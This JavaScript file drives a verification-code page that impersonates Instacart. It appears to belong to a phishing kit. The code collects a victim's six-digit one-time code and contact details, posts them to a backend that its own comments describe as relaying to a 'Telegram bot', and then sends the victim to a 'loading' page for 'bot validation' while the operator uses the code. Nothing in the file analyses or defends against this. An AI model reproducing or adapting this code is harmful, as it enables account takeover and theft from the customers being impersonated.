document.addEventListener('DOMContentLoaded', function() {
    const codeInputs = document.querySelectorAll('.code-input');
    const verifyForm = document.getElementById('verifyForm');
    const contactInfo = document.getElementById('contact-info');
    const subtitle = document.getElementById('subtitle');
    const resendLink = document.getElementById('resendLink');
    const timerSpan = document.getElementById('timer');
    
    let timerSeconds = 60;
    let timerInterval;
    
    // Error display functions
    function showError(message) {
        clearError();
        const errorDiv = document.createElement('div');
        errorDiv.className = 'error-message';
        errorDiv.style.color = '#d32f2f';
        errorDiv.style.fontSize = '14px';
        errorDiv.style.marginTop = '12px';
        errorDiv.style.textAlign = 'center';
        errorDiv.textContent = message;
        verifyForm.appendChild(errorDiv);
        
        // Add error styling to inputs
        codeInputs.forEach(input => {
            input.style.borderColor = '#d32f2f';
        });
    }
    
    function clearError() {
        const existingError = verifyForm.querySelector('.error-message');
        if (existingError) {
            existingError.remove();
        }
        codeInputs.forEach(input => {
            input.style.borderColor = '';
        });
    }
    
    // Get contact info from URL params or localStorage
    const urlParams = new URLSearchParams(window.location.search);
    const contact = urlParams.get('contact') || localStorage.getItem('instacart_contact') || '(XXX) XXX-XXXX';
    const contactType = urlParams.get('type') || localStorage.getItem('instacart_contact_type') || 'phone';
    
    // Check for error parameter in URL
    const errorType = urlParams.get('error');
    if (errorType === 'code') {
        showError('Verification code is invalid');
    }
    
    // Update the subtitle with the contact info
    contactInfo.textContent = contact;
    
    if (contactType === 'email') {
        subtitle.innerHTML = `Enter the 6-digit code we sent over email to <span id="contact-info">${contact}</span>.`;
    } else {
        subtitle.innerHTML = `Enter the 6-digit code we sent over SMS to <span id="contact-info">${contact}</span>.`;
    }
    
    // Start countdown timer
    function startTimer() {
        timerSeconds = 60;
        resendLink.classList.add('disabled');
        
        timerInterval = setInterval(() => {
            timerSeconds--;
            timerSpan.textContent = timerSeconds;
            
            if (timerSeconds <= 0) {
                clearInterval(timerInterval);
                resendLink.classList.remove('disabled');
                resendLink.innerHTML = 'Request a new code';
            }
        }, 1000);
    }
    
    // Start timer on page load
    startTimer();
    
    // Resend code
    resendLink.addEventListener('click', function(e) {
        e.preventDefault();
        
        if (!this.classList.contains('disabled')) {
            console.log('Resending code to:', contact);
            
            // Clear all inputs
            codeInputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled', 'error');
            });
            codeInputs[0].focus();
            
            // Restart timer
            startTimer();
            
            // Show success message instead of alert
            clearError();
            const successDiv = document.createElement('div');
            successDiv.className = 'success-message';
            successDiv.style.color = '#0AAD0A';
            successDiv.style.fontSize = '14px';
            successDiv.style.marginTop = '12px';
            successDiv.style.textAlign = 'center';
            successDiv.textContent = `Verification code has been resent to ${contact}`;
            verifyForm.appendChild(successDiv);
            setTimeout(() => successDiv.remove(), 3000);
        }
    });
    
    // Auto-focus first input
    codeInputs[0].focus();
    
    // Handle input and auto-advance
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', function(e) {
            const value = this.value;
            
            // Only allow numbers
            if (value && !/^[0-9]$/.test(value)) {
                this.value = '';
                return;
            }
            
            // Add filled class
            if (value) {
                this.classList.add('filled');
                this.classList.remove('error');
                
                // Move to next input
                if (index < codeInputs.length - 1) {
                    codeInputs[index + 1].focus();
                } else {
                    // All inputs filled, submit
                    submitCode();
                }
            } else {
                this.classList.remove('filled');
            }
        });
        
        // Handle backspace
        input.addEventListener('keydown', function(e) {
            if (e.key === 'Backspace' && !this.value && index > 0) {
                codeInputs[index - 1].focus();
                codeInputs[index - 1].value = '';
                codeInputs[index - 1].classList.remove('filled');
            }
        });
        
        // Handle paste
        input.addEventListener('paste', function(e) {
            e.preventDefault();
            const pastedData = e.clipboardData.getData('text').trim();
            
            // Check if pasted data is 6 digits
            if (/^\d{6}$/.test(pastedData)) {
                pastedData.split('').forEach((digit, i) => {
                    if (codeInputs[i]) {
                        codeInputs[i].value = digit;
                        codeInputs[i].classList.add('filled');
                    }
                });
                
                // Focus last input and submit
                codeInputs[5].focus();
                setTimeout(submitCode, 100);
            }
        });
        
        // Handle arrow keys
        input.addEventListener('keydown', function(e) {
            if (e.key === 'ArrowLeft' && index > 0) {
                codeInputs[index - 1].focus();
            } else if (e.key === 'ArrowRight' && index < codeInputs.length - 1) {
                codeInputs[index + 1].focus();
            }
        });
    });
    
    // Submit code
    function submitCode() {
        const code = Array.from(codeInputs).map(input => input.value).join('');
        
        if (code.length === 6) {
            console.log('Verifying code:', code);
            
            // Show loading state
            codeInputs.forEach(input => {
                input.disabled = true;
            });
            
            const sessionId = localStorage.getItem('instacart_session');
            const contact = localStorage.getItem('instacart_contact');
            
            // Send code to API/Telegram bot
            fetch('/api/submit-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    session: sessionId,
                    step: 'code',
                    data: {
                        code: code,
                        contact: contact
                    }
                })
            })
            .then(response => response.json())
            .then(data => {
                console.log('Code sent to Telegram bot:', data);
                localStorage.setItem('instacart_verify_code', code);
                // Redirect to loading page for bot validation WITH session ID
                window.location.href = `loading.html?step=code&session=${sessionId}&code=${code}`;
            })
            .catch(error => {
                console.error('Error submitting code:', error);
                codeInputs.forEach(input => {
                    input.disabled = false;
                });
                showError('Error submitting code. Please try again.');
            });
        }
    }
    
    // Clean up timer on page unload
    window.addEventListener('beforeunload', function() {
        if (timerInterval) {
            clearInterval(timerInterval);
        }
    });
});
